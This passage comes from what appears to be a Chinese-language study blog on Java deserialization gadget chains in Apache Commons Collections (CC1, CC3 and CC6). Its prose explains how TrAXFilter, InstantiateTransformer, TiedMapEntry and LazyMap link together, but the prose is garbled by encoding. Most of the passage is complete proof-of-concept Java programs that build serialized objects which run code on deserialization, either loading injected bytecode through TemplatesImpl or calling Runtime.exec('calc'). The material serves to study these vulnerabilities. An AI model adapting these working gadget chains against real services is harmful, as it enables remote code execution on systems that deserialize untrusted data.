class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC2-2">POC2</h3><p>æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœè¢«ç¦ç”¨äº†InvokerTransformerçš„è¯ï¼ŒCCå“ªæ¡é“¾éƒ½æ— æ³•æ‰§è¡Œï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±è€ƒè™‘èƒ½å¦ä¸ä½¿ç”¨ä»–æ¥æ„é€ é“¾å­ï¼Œäºæ˜¯å°±æƒ³æ‰¾åˆ°ä¸€ä¸ªä¸ä½¿ç”¨InvokerTransformeré‡Œé¢åå°„è°ƒç”¨çš„æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç›´æ¥è°ƒç”¨Templateslmplçš„newTransformerçš„ç±»ï¼š</p><p>æ‰€ä»¥CC3é“¾å­çš„ä½œè€…æ‰¾åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªç±»<code>TrAXFliter</code>ï¼ˆä¸å­˜åœ¨åºåˆ—åŒ–æ¥å£ï¼‰ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨newTransformerçš„ç±»ï¼š</p><p>é€šè¿‡chainedTransformerç±»ä¸­çš„transformæ–¹æ³•ï¼Œå…ˆä¼ å…¥TrAXFilter.classï¼Œç„¶ååœ¨é€šè¿‡InstantiateTransformerï¼ˆå­˜åœ¨åºåˆ—åŒ–æ¥å£ï¼‰çš„transformæ–¹æ³•ï¼Œå¯¹ä¸Šé¢ç±»å’Œç±»çš„æ„é€ æ–¹æ³•è¿›è¡Œè°ƒç”¨å¹¶å°†<code>TemplatesImpl Templates = new TemplatesImpl();</code>ä¼ å…¥ï¼Œè§¦å‘TrAXFliteræ„é€ æ–¹æ³•ä¸­çš„Templates.newInstance()æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404210853512.png" alt="image-20240404210853512"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404210915350.png" alt="image-20240404210915350"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC32</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//åªå¯¹invokerTransformerè¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å°±ä¼šåœ¨checkSetValueå¤„è°ƒç”¨transformæ–¹æ³•</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        transformedMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC6">CC6</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>ç®€å•æ¥è¯´æ˜¯DNSURLé“¾ä¸CC1çš„ç»“åˆï¼Œåˆ©ç”¨HashMapè°ƒç”¨æŸç±»çš„hashcodeæ–¹æ³•ï¼Œå†åˆ©ç”¨hashcodeè°ƒç”¨CC1ä¸­LazyMapé“¾çš„getæ–¹æ³•ï¼Œè¿›è€Œé“¾æ¥æ•´æ¡çº¿è·¯</p><h3 id="TiedMapEntry-hashCode">TiedMapEntry.hashCode</h3><p>åˆ©ç”¨ TiedMapEntry.hashCode å»è§¦å‘ LazyMap.get,æˆ‘ä»¬è¿›æ¥çœ‹ä¸€ä¸‹å®ƒçš„ hashCode</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233215141.png" alt="image-20240403233215141"></p><p>è·Ÿè¿› getValue</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233236830.png" alt="image-20240403233236830"></p><p>å†çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233243699.png" alt="image-20240403233243699"></p><p>å°±æ˜¯æ„é€ é”®å€¼å¯¹ï¼Œé‚£ä¹ˆåªéœ€è¦è®©å…¶mapä¸º LazyMap å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233253181.png" alt="image-20240403233253181"></p><p>ç„¶åå†çœ‹ HashMap.readObject</p><h3 id="HashMap-readObject">HashMap.readObject</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233327793.png" alt="image-20240403233327793"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233335386.png" alt="image-20240403233335386"></p><p>å°±æ˜¯è¿™é‡Œè§¦å‘ hashCode ,åªéœ€è¦è®©å…¶keyä¸º TiedMapEntry å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233343813.png" alt="image-20240403233343813"></p><p>å› ä¸ºå¯¹äºmapçš„èµ‹å€¼å¿…é¡»è¦ç”¨putï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨putè¿›è¡Œçš„èµ‹å€¼</p><h3 id="é—®é¢˜è§£å†³">é—®é¢˜è§£å†³</h3><p>è¿™é‡Œçš„putä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä»–æ‰§è¡Œçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œè¿›è€Œå°†æ•´æ¡é“¾å­ è§¦å‘ä¸€æ¬¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404130005220.png" alt="image-20240404130005220"></p><p>è€Œæœ€å…³é”®çš„æ˜¯åœ¨lazyMapéƒ¨åˆ†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404130041260.png" alt="image-20240404130041260"></p><p>åœ¨è¿™é‡Œè§¦å‘å®Œé“¾å­ä¹‹åï¼Œä¼šæ‰§è¡Œmap.putæ“ä½œï¼Œå°†keyæ”¾åˆ°mapé‡Œé¢ï¼Œè€Œæˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œfactory.transformçš„æ¡ä»¶æ˜¯mapä¸­çš„keyä¸å­˜åœ¨ã€‚å¦‚æœæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°†mapä¸­çš„keyèµ‹å€¼ï¼Œå°†ä¼šå¯¼è‡´å…¶åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ— æ³•è¿›å…¥ifåˆ¤æ–­ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ç”¨ç‰¹å®šçš„è¯­å¥åœ¨åºåˆ—åŒ–ä¹‹å‰å°†mapä¸­çš„keyå»æ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="POC1-2">POC1</h3><p>è¿™é‡Œå…ˆç»™å‡ºé“¾å­ï¼ˆæˆ‘è‡ªå·±å†™çš„ç‰ˆæœ¬ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//æŸ¥çœ‹æ„é€ å‡½æ•°ï¼Œä¼ å…¥çš„keyå’Œvalue</span></span><br><span class="line">       HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//mapçš„å›ºå®šè¯­æ³•ï¼Œå¿…é¡»è¦putè¿›å»,è¿™é‡Œçš„putä¼šå°†é“¾å­è¿èµ·æ¥ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        map1.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       serialize(map1);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC2-3">POC2</h3><p>è¿™é‡Œå’Œæˆ‘è‡ªå·±çš„pocçš„åŒºåˆ«å°±æ˜¯åœ¨å¼€å§‹çš„æ—¶å€™å°†è§¦å‘è®¡ç®—å™¨çš„è°ƒç”¨é“¾æ”¹æˆäº†æ²¡ç”¨çš„transfromï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰å†å°†å…¶æ›¿æ¢å›æ¥ï¼Œå®æµ‹åº”è¯¥æ˜¯å¯¹é“¾å­æ•´ä½“çš„è§¦å‘æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] 